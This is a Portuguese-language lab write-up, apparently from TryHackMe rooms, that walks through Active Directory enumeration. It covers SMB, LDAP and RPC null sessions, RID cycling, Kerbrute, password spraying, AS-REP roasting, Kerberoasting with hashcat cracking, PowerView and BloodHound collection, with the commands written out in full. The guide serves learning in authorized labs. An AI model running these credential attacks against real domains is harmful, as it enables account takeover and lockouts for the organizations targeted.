---
layout: post
title: "Active Directory (AD DS) - Guia prático de enumeração e autenticação"
description: "Guia de enumeração Active Directory do básico ao autenticado: rede, DNS, SMB, LDAP, RPC, CMD, PowerShell, PowerView, Kerberos, ACLs e BloodHound CE."
date: 2026-10-19
categories: [guia]
tags: [windows, active-directory, enumeration, nmap, smb, rpcclient, ldap, kerbrute, password-spraying, kerberos, as-rep-roasting, impacket, hashcat, powershell, powerview, bloodhound]
---

# Active Directory (AD DS) - Guia prático completo

Este guia reúne meus exercícios e aprendizados das rooms **Network Enumeration**, **User/Domain Enumeration**, **Password Spraying** e **Authenticated Enumeration** do TryHackMe. A sequência é a que eu usaria para começar uma avaliação de um domínio Windows.

> Material para laboratórios e ambientes expressamente autorizados. Algumas verificações de autenticação podem bloquear contas ou gerar alertas.


<a id="indice"></a>

## Índice

Este guia está dividido em blocos que acompanham a evolução do acesso: **primeiro identifico a rede, depois consulto o domínio, enumero com credenciais e finalmente analiso relações de privilégio**. Os comandos usam placeholders para funcionar em outras rooms.

| Bloco | Etapas |
|---|---|
| **1. Enumeração básica — rede e domínio** | [1. Preparação](#1-entender-a-rede-e-preparar-o-laboratório) · [2. Rede e serviços](#2-network-enumeration---descobrir-hosts-e-serviços) · [3. Usuários](#3-user-enumeration---descobrir-usuários-sem-login) · [4. Grupos e relações](#4-domain-enumeration---grupos-e-pertencimento) |
| **2. Autenticação e Kerberos** | [5. Políticas e spraying](#5-password-spraying---primeiro-a-política-de-senhas) · [6. AS-REP e Kerberoasting](#6-as-rep-roasting---testar-contas-sem-pré-autenticação) |
| **3. Enumeração autenticada — Windows e AD** | [7. CMD, serviços e tarefas](#7-authenticated-enumeration---cmd-na-estação-wrk) · [8. ActiveDirectory no PowerShell](#8-powershell-e-módulo-activedirectory) · [9. PowerView](#9-powerview---mais-consultas-sobre-o-domínio) |
| **4. Relações e priorização** | [10. BloodHound](#10-bloodhound---mapear-relações-e-privilégios) · [11. Checklist](#11-checklist-geral-para-os-próximos-laboratórios) |

**Regra prática:** uma enumeração pode mostrar **o que existe**; a análise de ACLs e relacionamentos ajuda a descobrir **o que minha identidade pode realmente acessar ou controlar**.

> **BLOCO 1 · Enumeração básica** — escopo de rede, DNS, portas, serviços, SMB, LDAP e RPC; sempre verificando se a consulta exige login.

## 1. Entender a rede e preparar o laboratório

O **Active Directory Domain Services (AD DS)** centraliza usuários, computadores, grupos, permissões e políticas do domínio. O **Domain Controller (DC)** guarda o diretório e participa da autenticação.

| Conceito | Significado |
|---|---|
| Domínio | Conjunto de identidades e recursos administrados centralmente |
| DC / KDC | Controlador do domínio / serviço Kerberos que emite tickets |
| WRK | Workstation, computador membro do domínio |
| LDAP (389) | Consulta objetos e atributos no diretório |
| Kerberos (88) | Autenticação por tickets |
| SMB (445) | Compartilhamentos e serviços Windows |
| MSRPC (135 e/ou SMB) | Consultas remotas de usuários, grupos e serviços |
| SID / RID | Identificador de segurança e sua parte final |
| OU / GPO | Unidade organizacional e política de grupo |

**Placeholders usados no guia:**

- <code>&lt;SUBNET/CIDR&gt;</code>: rede autorizada, como uma faixa /24.
- <code>&lt;DC_IP&gt;</code>: IP do controlador de domínio.
- <code>&lt;WRK_IP&gt;</code>: IP da estação Windows.
- <code>&lt;DOMAIN&gt;</code>: nome DNS do domínio.
- <code>&lt;USER&gt;</code> / <code>&lt;PASSWORD&gt;</code>: credenciais de laboratório.
- <code>&lt;ATTACKER_IP&gt;</code>: IP da AttackBox, quando necessário.

**Substitua os placeholders antes de executar os comandos.** Os alvos do DC e da WRK são diferentes: consultas LDAP/Kerberos costumam ir ao DC; enumeração local da estação vai à WRK.

~~~text
Reconhecimento da rede
        ↓
Enumeração sem credenciais (SMB / RPC / LDAP)
        ↓
Usuários, grupos e pertencimento
        ↓
Política de senhas
        ↓
Password spraying controlado / AS-REP Roasting
        ↓
Acesso autenticado à WRK
        ↓
CMD / PowerShell / PowerView
        ↓
BloodHound: relações e caminhos de privilégio
~~~

---

## 2. Network Enumeration - descobrir hosts e serviços

### 2.1 Encontrar máquinas ativas

Na AttackBox Linux:

~~~bash
fping -agq <SUBNET/CIDR>
~~~

| Opção | Função |
|---|---|
| <code>-a</code> | Mostra máquinas que responderam |
| <code>-g</code> | Gera os endereços da sub-rede |
| <code>-q</code> | Oculta mensagens extras |

Salvando hosts encontrados:

~~~bash
fping -agq <SUBNET/CIDR> 2>/dev/null > hosts.txt
cat hosts.txt
~~~

<code>2>/dev/null</code> descarta erros; <code>></code> cria ou sobrescreve o arquivo. Nem toda máquina ativa responderá a ICMP.

### 2.2 Identificar portas e serviços

~~~bash
nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt
~~~

- <code>-p</code>: limita as portas.
- <code>-sV</code>: detecta serviço/versão.
- <code>-sC</code>: scripts padrão do Nmap.
- <code>-iL</code>: lê IPs do arquivo.

Varredura TCP completa:

~~~bash
sudo nmap -sS -p- -T3 -iL hosts.txt -oN full_port_scan.txt
~~~

<code>-sS</code> usa TCP SYN; <code>-p-</code> cobre as portas 1–65535; <code>-T3</code> controla o ritmo; <code>-oN</code> salva a saída.

**Dica:** portas 88, 389 e 445, combinadas a DNS e outros serviços, ajudam a identificar possíveis controladores de domínio. Uma porta isolada não confirma o papel de DC.

### 2.3 Enumerar SMB e compartilhamentos

~~~bash
smbclient -L //<DC_IP> -N
smbmap -H <DC_IP>
nmap -p 445 --script smb-enum-shares <DC_IP>
enum4linux -a <DC_IP>
~~~

| Comando | Finalidade |
|---|---|
| <code>smbclient -L</code> | Lista compartilhamentos |
| <code>-N</code> | Tenta conexão sem senha |
| <code>smbmap</code> | Mostra shares e permissões disponíveis |
| <code>smb-enum-shares</code> | Enumeração via script NSE |
| <code>enum4linux -a</code> | Consolida verificações SMB/RPC |

Se um compartilhamento permitir acesso anônimo:

~~~bash
smbclient //<DC_IP>/<SHARE> -N
~~~

No prompt interativo:

~~~text
smb: \> ls
smb: \> get arquivo.txt
smb: \> exit
~~~

**Aprendizado:** listar um share não garante autorização para abrir ou baixar todos os arquivos.


### 2.4 Resolver nomes e identificar o controlador de domínio

Quando Nmap indica LDAP e Kerberos, verifico os registros de serviço DNS:

~~~bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN> <DC_IP>
nslookup -type=SRV _kerberos._tcp.<DOMAIN> <DC_IP>
~~~

- <code>SRV</code>: registro DNS que informa host e porta de um serviço.
- <code>_ldap._tcp.dc._msdcs</code>: localiza controladores de domínio LDAP.
- <code>_kerberos._tcp</code>: identifica serviços Kerberos do domínio.

Para ferramentas baseadas em nomes, como Kerberos e BloodHound, a resolução correta de <code>dc01.exemplo.local</code> é tão importante quanto o IP. Ajusto DNS do laboratório e, se necessário, o arquivo <code>/etc/hosts</code> — apenas para nomes realmente identificados, sem inventar hosts.

---

## 3. User Enumeration - descobrir usuários sem login

O objetivo é identificar contas que possam ser analisadas posteriormente, sem começar por tentativas de senha.

### 3.1 LDAP: verificar acesso anônimo

~~~bash
ldapsearch -x -H ldap://<DC_IP> -s base
~~~

- <code>-x</code>: autenticação LDAP simples (anônima, sem <code>-D</code>).
- <code>-H</code>: servidor LDAP.
- <code>-s base</code>: consulta apenas o RootDSE.

O atributo importante é:

~~~text
defaultNamingContext: DC=exemplo,DC=local
~~~

O <code>defaultNamingContext</code> fornece a base do diretório. Conseguir ler RootDSE **não significa** que todo o AD aceite leitura anônima.

Consultar usuários:

~~~bash
ldapsearch -x -LLL -H ldap://<DC_IP> \
  -b "DC=exemplo,DC=local" \
  "(&(objectCategory=person)(objectClass=user))" sAMAccountName
~~~

- <code>-b</code>: base LDAP obtida na consulta anterior.
- <code>-LLL</code>: saída resumida.
- <code>sAMAccountName</code>: login da conta.

Salvar somente os nomes, quando permitido:

~~~bash
ldapsearch -x -LLL -H ldap://<DC_IP> \
  -b "DC=exemplo,DC=local" \
  "(&(objectCategory=person)(objectClass=user))" sAMAccountName |
awk '/^sAMAccountName: / {print $2}' > ldap_users.txt
~~~

**Ajuste <code>DC=exemplo,DC=local</code> conforme o seu domínio.** O <code>awk</code> extrai apenas o valor do atributo.

### 3.2 Enum4linux-ng

~~~bash
enum4linux-ng -A <DC_IP> -oA results
~~~

<code>-A</code> tenta enumerar usuários, grupos, shares, política de senhas, sistema etc. <code>-oA</code> salva relatórios estruturados com o prefixo escolhido. A quantidade de dados depende das permissões disponíveis.

### 3.3 RPC Null Session

~~~bash
rpcclient -U "" -N <DC_IP>
~~~

<code>-U ""</code> define usuário vazio; <code>-N</code> não solicita senha. Isso só funcionará se o serviço permitir a consulta anônima.

Dentro do <code>rpcclient</code>:

~~~text
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydispinfo
rpcclient $> queryuser 0xa31
rpcclient $> help
~~~

O laboratório mostrou contas como Administrator, Guest, asrepuser1 e rduke. O <code>enumdomusers</code> retorna, além do nome, o **RID** da conta.

Salvar diretamente:

~~~bash
rpcclient -U "" -N <DC_IP> -c enumdomusers |
awk -F'[][]' '/^user:/ {print $2}' > rpc_users.txt
~~~

<code>-c</code> executa um comando RPC e encerra; <code>awk -F'[][]'</code> separa a linha pelos colchetes.

### 3.4 RID Cycling - consultar contas por identificador

Se <code>enumdomusers</code> for limitado, testar uma faixa de RIDs:

~~~bash
for i in $(seq 500 3000); do
  rpcclient -U "" -N <DC_IP> -c "queryuser $i" 2>/dev/null |
    grep -i "User Name"
done
~~~

O <code>for</code> percorre os RIDs; <code>grep -i</code> seleciona o campo do nome. A consulta pode ser demorada.

**Dica aprendida:** a faixa 500–2000 não era suficiente para encontrar todos os objetos da room: <code>rduke</code> tinha RID <code>0xa31</code>, isto é, **2609** em decimal.

### 3.5 Consolidar os nomes sem perder o arquivo

~~~bash
cat ldap_users.txt rpc_users.txt | sort -u > users.txt
wc -l users.txt
~~~

Para remover duplicatas **no próprio arquivo**:

~~~bash
sort -u -o users.txt users.txt
~~~

Não usar <code>sort -u users.txt > users.txt</code>: o redirecionamento pode zerar o arquivo antes da leitura. <code>-o</code> faz a gravação de saída corretamente.

### 3.6 Kerbrute: validar nomes via Kerberos

~~~bash
chmod +x kerbrute
./kerbrute userenum --dc <DC_IP> -d <DOMAIN> users.txt
~~~

<code>userenum</code> verifica se o KDC reconhece nomes; <code>--dc</code> define o controlador; <code>-d</code> define o domínio.

Uma resposta <code>VALID USERNAME</code> indica um nome reconhecido pelo Kerberos, **não** que a conta esteja ativa, que a senha seja conhecida ou que o login esteja autorizado. Contas terminadas em <code>$</code> geralmente são de computadores.

---

## 4. Domain Enumeration - grupos e pertencimento

Agora queremos saber **qual é o grupo de cada conta**, não apenas seu nome.

### 4.1 Listar e consultar grupos por RPC

~~~bash
rpcclient -U "" -N <DC_IP> -c enumdomgroups
rpcclient -U "" -N <DC_IP> -c "querygroup 0x201"
~~~

RIDs conhecidos: **500** (Administrator), **501** (Guest), **512** (Domain Admins), **513** (Domain Users) e **514** (Domain Guests).

### 4.2 Exemplo real da room: grupo de rduke

Foi executado:

~~~bash
rpcclient -U "" -N <DC_IP> -c "queryusergroups 0xa31"
~~~

Resultado:

~~~text
group rid:[0x201] attr:[0x7]
~~~

Conferência com LDAP:

~~~bash
ldapsearch -x -LLL -H ldap://<DC_IP> \
  -b "DC=exemplo,DC=local" \
  "(sAMAccountName=rduke)" memberOf primaryGroupID
~~~

Resultado observado:

~~~text
dn: CN=Raoul Duke,CN=Users,DC=exemplo,DC=local
primaryGroupID: 513
~~~

Interpretação:

~~~text
rduke
  → RID do grupo 0x201
  → 513 em decimal
  → Domain Users
~~~

**Principal aprendizado:** o atributo LDAP <code>memberOf</code> geralmente **não inclui o grupo primário**. Portanto, <code>memberOf</code> vazio não significa que a conta não pertença a nenhum grupo. Consultar também <code>primaryGroupID</code>. O campo RPC <code>attr:[0x7]</code> representa flags, e não outro grupo.

### 4.3 Contar usuários e grupos: local x domínio

Essas consultas **não são intercambiáveis**:

| Objetivo | Comando no Windows |
|---|---|
| Usuários locais da WRK | <code>(Get-LocalUser).Count</code> |
| Grupos locais da WRK | <code>(Get-LocalGroup).Count</code> |
| Usuários do AD | <code>(Get-ADUser -Filter *).Count</code> |
| Grupos retornados pelo AD | <code>(Get-ADGroup -Filter *).Count</code> |
| Grupos globais via NET | <code>net group /domain</code> |
| Grupos locais via NET | <code>net localgroup</code> |

**Erro que esclareci na prática:** <code>(Get-LocalGroup).Count</code> retornou **25**, mas eu precisava do número de **usuários** locais. O correto era <code>(Get-LocalUser).Count</code>.

Também observei **21** grupos com <code>net group /domain</code>, **54** com <code>Get-ADGroup -Filter *</code> e **58** na coleta BloodHound. Eles podem diferir porque <code>net group</code> lista principalmente grupos globais, enquanto o cmdlet AD retorna múltiplos escopos e o coletor possui regras/escopo próprios. Não usar um número de uma ferramenta para responder à pergunta referente a outra sem verificar seu escopo. Os valores são registros do exercício, não uma contagem universal do domínio.


### 4.4 Grupos de domínio não são automaticamente administradores locais

Depois de descobrir uma conta, procuro seu papel no domínio:

~~~cmd
net user <USER> /domain
net group "Domain Admins" /domain
~~~

Grupos personalizados (por exemplo, <code>sysadmin</code>) precisam ser investigados por **descrição, membros, GPOs e ACLs**. O nome de um grupo não garante privilégios de <code>Domain Admin</code> nem de administrador local. No DC, a distinção entre contas locais e do domínio exige atenção: um controlador de domínio não possui a mesma base de contas locais de uma estação WRK.


> **BLOCO 2 · Política de autenticação e Kerberos** — primeiro observo a política, depois escolho um teste justificado. Não confundo tentativas online com cracking offline.

---

## 5. Password Spraying - primeiro a política de senhas

**Password spraying**: testar uma senha candidata em vários usuários. Diferentemente do brute force concentrado em uma única conta, distribui as tentativas, mas **também pode causar bloqueios**.

### 5.1 Consultar a política

~~~bash
rpcclient -U "" -N <DC_IP> -c getdompwinfo
~~~

Resultado observado:

~~~text
min_password_length: 7
password_properties: 0x00000001
DOMAIN_PASSWORD_COMPLEX
~~~

Também é possível usar:

~~~bash
crackmapexec smb <DC_IP> --pass-pol
~~~

<code>0x00000001</code> indica a flag de complexidade de senha. Em configurações tradicionais do Windows, isso exige combinações de categorias de caracteres (em geral três das quatro: maiúsculas, minúsculas, números e especiais), além do comprimento mínimo.

Consultar também limiar e janela de bloqueio. A política padrão do domínio pode ser diferente de uma **Fine-Grained Password Policy** aplicada a contas específicas.

### 5.2 Spray controlado em laboratório

Com a lista já validada e uma única senha permitida pelo exercício:

~~~bash
crackmapexec smb <WRK_IP> -u users.txt -p '<PASSWORD>'
~~~

- <code>-u</code>: arquivo com usuários.
- <code>-p</code>: senha candidata.
- <code>smb</code>: autenticação via SMB.

A room também apresenta o uso de uma lista:

~~~bash
crackmapexec smb <WRK_IP> -u users.txt -p passwords.txt
~~~

**Cuidado:** usando <code>passwords.txt</code>, são feitas múltiplas tentativas por conta. Isso aumenta o risco de bloqueio e não equivale a uma rodada de spray com uma senha.

Mensagens comuns:

| Saída | Interpretação |
|---|---|
| <code>[+]</code> | Autenticação aceita |
| <code>[-]</code> | Tentativa não aceita |
| <code>STATUS_LOGON_FAILURE</code> | Credencial inválida ou logon recusado |
| <code>STATUS_ACCOUNT_LOCKED_OUT</code> | Conta bloqueada |
| <code>STATUS_PASSWORD_EXPIRED</code> | Senha expirada |

**Ordem correta:** enumerar contas → verificar políticas → validar escopo e limite de tentativas → executar o mínimo necessário → registrar resultados.

---

## 6. AS-REP Roasting - testar contas sem pré-autenticação

O **AS-REP Roasting** aproveita contas com a flag <code>UF_DONT_REQUIRE_PREAUTH</code>: o DC pode devolver dados AS-REP sem exigir que o solicitante conheça a senha. Esses dados podem ser testados **offline**.

**Fases:** descobrir contas vulneráveis → coletar AS-REP → testar candidatos localmente.

### 6.1 Coletar pelo Linux com Impacket

~~~bash
GetNPUsers.py <DOMAIN>/ \
  -dc-ip <DC_IP> \
  -usersfile users.txt \
  -format hashcat \
  -outputfile hashes.txt \
  -no-pass
~~~

Em distribuições mais novas o nome pode ser <code>impacket-GetNPUsers</code>.

| Opção | Significado |
|---|---|
| <code>-dc-ip</code> | Endereço do DC |
| <code>-usersfile</code> | Arquivo de usuários candidatos |
| <code>-format hashcat</code> | Formato dos dados recuperados |
| <code>-outputfile</code> | Arquivo de saída |
| <code>-no-pass</code> | Não pedir senha |

Mensagens importantes:

- <code>doesn't have UF_DONT_REQUIRE_PREAUTH set</code>: pré-autenticação **habilitada**; a conta não permite essa coleta.
- <code>KDC_ERR_CLIENT_REVOKED</code>: conta bloqueada, desativada ou revogada, dependendo do contexto.
- <code>$krb5asrep$23$...</code>: AS-REP do tipo 23, adequado ao Hashcat modo 18200.

No Windows, o comando estudado foi:

~~~cmd
Rubeus.exe asreproast
~~~

### 6.2 Testar senhas offline

~~~bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 hashes.txt --show
~~~

<code>-m 18200</code> seleciona Kerberos AS-REP etype 23; <code>--show</code> exibe senhas já recuperadas.

**Aprendizado:** Hashcat compara senhas candidatas com o material criptográfico, não “descriptografa a senha”. Apesar de aparecer perto da enumeração autenticada na trilha, **AS-REP Roasting pode começar sem autenticação prévia**.


### 6.3 Kerberoasting não é AS-REP Roasting

As duas técnicas permitem testes **offline**, mas o requisito muda:

| Técnica | Conta-alvo | O que solicito ao KDC | Hashcat (RC4 / etype 23) |
|---|---|---|---|
| AS-REP Roasting | Usuário com pré-autenticação desabilitada | AS-REP, sem conhecer sua senha | <code>-m 18200</code> |
| Kerberoasting | Conta de serviço associada a SPN | TGS, normalmente com login válido no domínio | <code>-m 13100</code> |

O SPN é o identificador de serviço (por exemplo, <code>HTTP/servidor.dominio</code>). Uma conta com SPN **não significa senha fraca**, nem garante que um serviço esteja acessível na rede.

~~~bash
GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' \
  -dc-ip <DC_IP> \
  -request-user <SERVICE_ACCOUNT> \
  -outputfile servico.tgs

hashcat -m 13100 servico.tgs wordlist.txt
hashcat -m 13100 servico.tgs --show
~~~

- <code><DOMAIN>/<USER>:<PASSWORD></code>: credencial **do usuário que solicita** o ticket; não é a senha do serviço-alvo.
- <code>-request-user</code>: seleciona qual conta associada a SPN terá o TGS solicitado.
- <code>-outputfile</code>: grava material no formato aceito pelo Hashcat.
- <code>-m 13100</code>: apenas TGS **etype 23 / RC4-HMAC**. Outros tipos exigem modos diferentes.
- <code>\\</code> ao final da linha: continua o mesmo comando no Bash.

**Aprendizado:** um usuário comum autenticado pode conseguir um TGS; não é necessário ter a senha do serviço para realizar o Kerberoasting. <code>Status: Exhausted</code> e <code>Recovered: 0</code> significam apenas que os candidatos daquela execução não recuperaram a senha. Nenhum resultado de cracking deve ser tratado como acesso comprovado sem autenticação posterior.

---

> **BLOCO 3 · Enumeração autenticada** — acesso como usuário de domínio: contexto da sessão, privilégios do token, serviços, tarefas, registro, AD e ACLs.

## 7. Authenticated Enumeration - CMD na estação WRK

Com credenciais autorizadas no exercício, acessar a estação:

~~~bash
ssh <USER>@<WRK_IP>
~~~

O prompt poderá exibir <code>DOMINIO\usuario@WRK</code>. Isso indica uma sessão usando conta de domínio; <code>WRK\usuario</code> normalmente designa conta local.

### 7.1 Identidade e sistema

~~~cmd
whoami
whoami /all
hostname
systeminfo
set
~~~

- <code>whoami /all</code>: SID, grupos do token e privilégios atuais.
- <code>hostname</code>: máquina.
- <code>systeminfo</code>: SO, correções e domínio, sujeito às permissões.
- <code>set</code>: variáveis de ambiente.

Privilégios de interesse:

| Privilégio | Por que verificar |
|---|---|
| <code>SeImpersonatePrivilege</code> | Impersonação de tokens sob condições específicas |
| <code>SeAssignPrimaryTokenPrivilege</code> | Atribuir token primário a processos |
| <code>SeBackupPrivilege</code> | Acesso de backup a arquivos protegidos |
| <code>SeRestorePrivilege</code> | Operações de restauração privilegiadas |
| <code>SeDebugPrivilege</code> | Depuração/acesso a processos |

A presença de um privilégio **não garante** que ele possa ser explorado.

### 7.2 Usuários e grupos com NET

~~~cmd
net user
net user /domain
net user rduke /domain
net group /domain
net group "Domain Admins" /domain
net group "Domain Computers" /domain
net localgroup
net localgroup administrators
~~~

| Comando | Onde consulta |
|---|---|
| <code>net user</code> | Contas **locais** da WRK |
| <code>net user /domain</code> | Contas de usuário do domínio |
| <code>net user rduke /domain</code> | Atributos e grupos de rduke |
| <code>net group /domain</code> | Grupos globais do domínio |
| <code>net group "Domain Admins" /domain</code> | Membros desse grupo |
| <code>net localgroup</code> | Grupos locais da WRK |
| <code>net localgroup administrators</code> | Quem administra a WRK |

**Importante:** um administrador **local** da WRK não é necessariamente **Domain Admin**. Um grupo de domínio também pode ter sido adicionado aos administradores locais.

### 7.3 Sessões, processos, serviços e tarefas

~~~cmd
quser
tasklist /v
net session
wmic service get Name,StartName
sc query state= all
sc qc DHCP
schtasks /query /fo LIST /v
~~~

- <code>quser</code>: usuários com sessões interativas (console/RDP).
- <code>tasklist /v</code>: processos, com detalhes extras.
- <code>net session</code>: sessões SMB, normalmente exige elevação.
- <code>StartName</code> / <code>SERVICE_START_NAME</code>: identidade sob a qual o serviço executa.
- <code>sc qc</code>: configuração de um serviço.
- <code>schtasks /query</code>: tarefas agendadas.

Serviços do Windows são processos gerenciados pelo Service Control Manager. Podem executar como <code>LocalSystem</code>, <code>LocalService</code>, <code>NetworkService</code>, conta virtual ou usuário do domínio; **não dependem de uma sessão interativa**. Tarefas agendadas executam segundo seus próprios gatilhos e contexto de segurança. Algumas consultas exigem privilégios elevados. Em PowerShell, para chamar a ferramenta <code>sc</code>, prefira <code>sc.exe</code>, pois <code>sc</code> pode ser alias de <code>Set-Content</code>.

### 7.4 Registro e aplicações

~~~cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
~~~

O primeiro caminho guarda configurações de logon; em máquinas mal configuradas pode haver dados de autologon. O segundo ajuda a identificar aplicativos instalados. A leitura de algumas chaves depende de permissão.


### 7.5 Pastas, permissões e erros que importam

Encontrar uma pasta não equivale a conseguir lê-la, alterá-la ou executar código no contexto de outra conta.

~~~powershell
Test-Path -LiteralPath 'C:\Scripts'
Get-ChildItem -LiteralPath 'C:\Scripts' -Force -ErrorAction Continue
icacls.exe 'C:\Scripts'
icacls.exe 'C:\Downloads'
~~~

O <code>icacls.exe</code> recebe o alvo conforme sua própria sintaxe; para inspecionar vários diretórios independentes, faço chamadas separadas. <code>-ErrorAction Continue</code> mostra erros em vez de ocultá-los com <code>SilentlyContinue</code>.

| Permissão / resultado | Interpretação |
|---|---|
| <code>RX</code> | Ler e executar; **não** equivale a modificar |
| <code>WD</code> / <code>AD</code> | Escrever dados / criar subdiretórios conforme ACE e herança |
| <code>F</code> | Controle total no objeto indicado |
| <code>Access denied</code> | A identidade atual não conseguiu executar aquela operação |

**Ponto importante:** poder criar um arquivo em <code>C:\Downloads</code> não significa poder substituir um arquivo administrativo preexistente. Para identificar um caminho de privilégio, preciso também de um **processo, serviço ou tarefa privilegiada que consuma um recurso modificável por mim**.

---

## 8. PowerShell e módulo ActiveDirectory

Abrir PowerShell a partir do CMD:

~~~cmd
powershell
~~~

Verificar/importar o módulo:

~~~powershell
Get-Module -ListAvailable ActiveDirectory
Import-Module ActiveDirectory
~~~

Em estações, o módulo costuma depender de RSAT ou de um pacote já disponibilizado no laboratório.

### 8.1 Usuários

~~~powershell
Get-ADUser -Filter * | Select-Object Name,SamAccountName,Enabled
Get-ADUser -Identity rduke -Properties LastLogonDate,MemberOf,Description,Title
Get-ADUser -Filter "Name -like '*admin*'"
(Get-ADUser -Filter *).Count
~~~

<code>-Filter</code> seleciona objetos; <code>-Properties</code> solicita atributos extras; <code>Select-Object</code> limita as colunas; <code>.Count</code> conta resultados.

### 8.2 Grupos

~~~powershell
Get-ADGroup -Filter * | Select-Object Name,GroupScope
Get-ADGroupMember -Identity "Domain Admins"
(Get-ADGroup -Filter *).Count
~~~

<code>GroupScope</code> permite diferenciar grupos **Global**, **Universal** e **DomainLocal**.

### 8.3 Computadores e política

~~~powershell
Get-ADComputer -Filter * | Select-Object Name,OperatingSystem
Get-ADDefaultDomainPasswordPolicy
~~~

Na política, observar <code>MinPasswordLength</code>, <code>ComplexityEnabled</code>, <code>LockoutThreshold</code> e <code>LockoutDuration</code>. <code>LockoutThreshold = 0</code> significa que a **política padrão** não impõe bloqueio por quantidade de falhas, mas não dispensa a avaliação de políticas por usuário.

### 8.4 Contas/grupos locais em PowerShell

~~~powershell
Get-LocalUser
(Get-LocalUser).Count
Get-LocalGroup
(Get-LocalGroup).Count
Get-LocalGroupMember -Group Administrators
~~~

**Lembrete:** não confundir <code>Get-LocalUser</code> com <code>Get-LocalGroup</code> ao responder quantidades pedidas pela room.


### 8.5 Atributos de contas de serviço e delegação

~~~powershell
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName |
  Select-Object SamAccountName,ServicePrincipalName

Get-ADUser -Identity <SERVICE_ACCOUNT> -Properties TrustedToAuthForDelegation,msDS-AllowedToDelegateTo |
  Select-Object SamAccountName,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo
~~~

<code>ServicePrincipalName</code> ajuda a encontrar contas associadas a serviços; <code>msDS-AllowedToDelegateTo</code> mostra destinos configurados para delegação restrita tradicional. Uma flag de delegação isolada **não garante** que seja possível representar outra conta perante qualquer serviço.

**Quando preciso enxergar permissões entre objetos**, não basta listar membros de grupos: examino ACLs, GPOs e relações de controle (PowerView e BloodHound).

---

## 9. PowerView - mais consultas sobre o domínio

O **PowerView** integra o conjunto PowerSploit e ajuda a analisar usuários, grupos, SPNs, computadores e direitos sobre objetos do AD. No laboratório o arquivo estava disponível no diretório <code>Recon</code> do PowerSploit.

~~~powershell
. .\PowerView.ps1
Get-DomainUser
Get-DomainUser *admin*
Get-DomainGroup "*admin*"
Get-DomainComputer
Get-DomainUser -SPN
Get-DomainObjectAcl -Identity <USER> -ResolveGUIDs
~~~

A expressão <code>. .\PowerView.ps1</code> faz **dot-sourcing** para carregar funções na sessão atual. O parâmetro <code>-SPN</code> procura contas com Service Principal Names (Kerberoasting); <code>Get-DomainObjectAcl</code> examina permissões no objeto, e <code>-ResolveGUIDs</code> traduz identificadores de direitos quando possível. A versão do PowerView e os direitos de leitura podem limitar a saída.

**Diferença rápida:** AS-REP Roasting busca contas sem pré-autenticação; Kerberoasting envolve tickets de serviço associados a SPNs. São técnicas distintas.

---

> **BLOCO 4 · Relações de privilégio e checklist** — em vez de testar novas técnicas aleatoriamente, organizo as permissões obtidas na enumeração e investigo caminhos concretos.

## 10. BloodHound - mapear relações e privilégios

Depois da enumeração tradicional, falta responder à pergunta principal: **minha conta possui uma relação de controle com outro usuário, grupo ou computador?** O BloodHound transforma usuários, grupos e máquinas em **nós (nodes)** e permissões/associações em **arestas (edges)**.

| Ferramenta | Onde executa | Para que uso |
|---|---|---|
| <code>SharpHound.exe</code> | Windows autenticado no domínio | Coleta oficial, incluindo relações de AD e, conforme o método, informações de computadores |
| <code>bloodhound-ce-python</code> | Linux / AttackBox | Coleta remota para **BloodHound Community Edition** |
| <code>bloodhound-python</code> | Linux / AttackBox | Coletor de **BloodHound Legacy**: não presumir compatibilidade com CE |
| <code>BloodHound CE</code> | Interface web | Importar dados, investigar ACLs e visualizar caminhos |

**Compatibilidade importa:** o projeto BloodHound.py distingue o coletor Legacy (<code>bloodhound-python</code>) do CE (<code>bloodhound-ce-python</code>). No BloodHound CE, o SharpHound compatível deve ser obtido na própria interface (**Settings → Download Collectors**). Consulte [BloodHound.py](https://github.com/dirkjanm/BloodHound.py) e [SharpHound](https://github.com/SpecterOps/SharpHound).

### 10.1 Coletar pela AttackBox (Linux)

Primeiro confiro o executável disponível:

~~~bash
command -v bloodhound-ce-python
command -v bloodhound-python
~~~

Se o ambiente usa **CE**, mas o primeiro não existe, a instalação isolada por <code>pipx install bloodhound-ce</code> evita misturar dependências. Em ambientes com coletor já fornecido pela room, uso a versão apropriada sem reinstalar tudo.

~~~bash
bloodhound-ce-python -u <USER> -p '<PASSWORD>' \
  -d <DOMAIN> -ns <DC_IP> \
  -c DCOnly --zip
~~~

| Parâmetro | Função |
|---|---|
| <code>-u</code> / <code>-p</code> | Usuário e senha **de domínio** conhecidos |
| <code>-d</code> | Nome DNS do domínio |
| <code>-ns</code> | DNS a consultar — no laboratório, normalmente o DC |
| <code>-c DCOnly</code> | Coleta relações consultáveis via DC, como grupos, ACLs e trusts, sem enumerar individualmente outros hosts |
| <code>--zip</code> | Gera pacote para importar na interface |

Quando a coleta somente pelo DC não responde uma questão de **sessões ou privilégios locais**, amplio o escopo conscientemente, por exemplo para <code>-c All</code>. Coletas mais abrangentes podem gerar mais tráfego e alertas.

**Exemplo registrado em outra room:** o coletor retornou 1 domínio, 2 computadores, 32 usuários, 58 grupos, 5 GPOs, 15 OUs e 0 trusts. Uma tentativa Kerberos falhou por resolução de nomes e fez fallback para NTLM. Essas contagens **pertencem àquela room**, não ao laboratório atual.

### 10.2 Coletar pelo Windows (SharpHound)

~~~cmd
SharpHound.exe --CollectionMethods DCOnly --Domain <DOMAIN>
~~~

Usar o binário **compatível com a instância CE** e somente quando sua execução for permitida no laboratório. Um coletor Windows não concede privilégios administrativos; regras AppLocker/Defender podem impedir sua execução. <code>DCOnly</code> concentra a coleta nas relações do diretório; <code>All</code> inclui métodos adicionais, sujeitos a permissões e disponibilidade.

### 10.3 Importar e analisar sem se perder no grafo

Na instância CE do laboratório:

1. **Administration → File Ingest**: enviar o ZIP.
2. **Explore**: buscar o nó da conta já comprometida.
3. **Node Info**: revisar <code>Member Of</code>, <code>Outbound Object Control</code>, direitos de execução e sessões, quando coletadas.
